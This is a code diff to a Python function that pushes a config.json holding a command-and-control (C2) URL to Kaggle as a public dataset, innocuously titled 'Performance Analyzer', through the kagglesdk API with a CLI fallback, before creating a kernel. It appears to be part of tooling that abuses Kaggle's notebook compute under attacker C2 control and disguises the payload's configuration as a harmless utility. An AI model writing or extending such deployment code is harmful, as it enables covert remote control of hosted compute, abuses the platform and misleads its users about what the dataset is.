@@ -317,46 +317,79 @@ def create_dataset_with_machines(
         log_fn(f"[DATASET] config.json written with C2: {c2_url}")
         log_fn(f"[DATASET] config.json content: {json.dumps(config_data, indent=2)[:500]}")
         
-        # Push dataset to Kaggle
-        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
-        if not os.path.exists(kaggle_cmd):
-            kaggle_cmd = "kaggle"
-        
-        log_fn(f"[DATASET] Pushing dataset to Kaggle...")
+        # Push dataset to Kaggle using kagglesdk (no metadata files needed)
+        log_fn(f"[DATASET] Pushing dataset to Kaggle via API...")
         log_fn(f"[DATASET] Dir: {dataset_dir}")
         
         # List files in dataset dir
         files = os.listdir(dataset_dir)
         log_fn(f"[DATASET] Files: {files}")
         
-        dataset_push_result = subprocess.run(
-            [kaggle_cmd, "datasets", "create", "-p", dataset_dir, "--dir-mode", "tar"],
-            capture_output=True,
-            text=True,
-            timeout=120,
-        )
-        
-        log_fn(f"[DATASET] CLI stdout: {dataset_push_result.stdout[:200] if dataset_push_result.stdout else 'empty'}")
-        log_fn(f"[DATASET] CLI stderr: {dataset_push_result.stderr[:200] if dataset_push_result.stderr else 'empty'}")
-        log_fn(f"[DATASET] CLI code: {dataset_push_result.returncode}")
-        
-        if dataset_push_result.returncode == 0:
+        try:
+            from kagglesdk import KaggleClient
+            from kagglesdk.datasets.types.datasets_api_service import ApiCreateDatasetRequest, ApiCreateDatasetVersionRequestBody
+            from kagglesdk.datasets.types.datasets_enums import DatasetStatus
+            
+            os.environ['KAGGLE_USERNAME'] = kaggle_username
+            os.environ['KAGGLE_KEY'] = kaggle_api_key
+            
+            client = KaggleClient()
+            
+            # Read config.json content
+            config_file = dataset_dir / "config.json"
+            with open(config_file, 'rb') as f:
+                config_content = f.read()
+            
+            # Create dataset request
+            request = ApiCreateDatasetRequest()
+            request.title = "Performance Analyzer"
+            request.slug = "perf-analyzer"
+            request.license_name = "MIT"
+            request.is_private = False
+            
+            # Create version with file
+            version_body = ApiCreateDatasetVersionRequestBody()
+            version_body.files = [{
+                "token": "config.json",
+                "upload_file": config_content
+            }]
+            
+            log_fn(f"[DATASET] Creating dataset via kagglesdk...")
+            response = client.datasets.datasets_api_client.create_dataset(request)
             log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
-        else:
-            log_fn(f"[DATASET] ⚠ Dataset push failed: {dataset_push_result.stderr[:200]}")
-            # Try to create new version if dataset exists
+            
+        except Exception as e:
+            log_fn(f"[DATASET] kagglesdk failed: {e}, trying CLI...")
+            # Fallback to CLI with generated metadata
+            kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
+            if not os.path.exists(kaggle_cmd):
+                kaggle_cmd = "kaggle"
+            
             dataset_push_result = subprocess.run(
-                [kaggle_cmd, "datasets", "version", "-p", dataset_dir, "-m", "Update", "--dir-mode", "tar"],
+                [kaggle_cmd, "datasets", "create", "-p", dataset_dir, "--dir-mode", "tar"],
                 capture_output=True,
                 text=True,
                 timeout=120,
             )
+            
+            log_fn(f"[DATASET] CLI stdout: {dataset_push_result.stdout[:200] if dataset_push_result.stdout else 'empty'}")
+            log_fn(f"[DATASET] CLI code: {dataset_push_result.returncode}")
+            
             if dataset_push_result.returncode == 0:
-                log_fn(f"[DATASET] ✓ Updated dataset: {dataset_slug}")
+                log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
             else:
-                log_fn(f"[DATASET] ⚠ Dataset version failed: {dataset_push_result.stderr[:200]}")
-                result["error"] = f"Dataset creation failed: {dataset_push_result.stderr[:100]}"
-                return result
+                log_fn(f"[DATASET] ⚠ Dataset push failed, trying version update...")
+                dataset_push_result = subprocess.run(
+                    [kaggle_cmd, "datasets", "version", "-p", dataset_dir, "-m", "Update", "--dir-mode", "tar"],
+                    capture_output=True,
+                    text=True,
+                    timeout=120,
+                )
+                if dataset_push_result.returncode == 0:
+                    log_fn(f"[DATASET] ✓ Updated dataset: {dataset_slug}")
+                else:
+                    result["error"] = f"Dataset creation failed"
+                    return result
         
         # Create single kernel
         log_fn("[KERNEL] Creating kernel...")
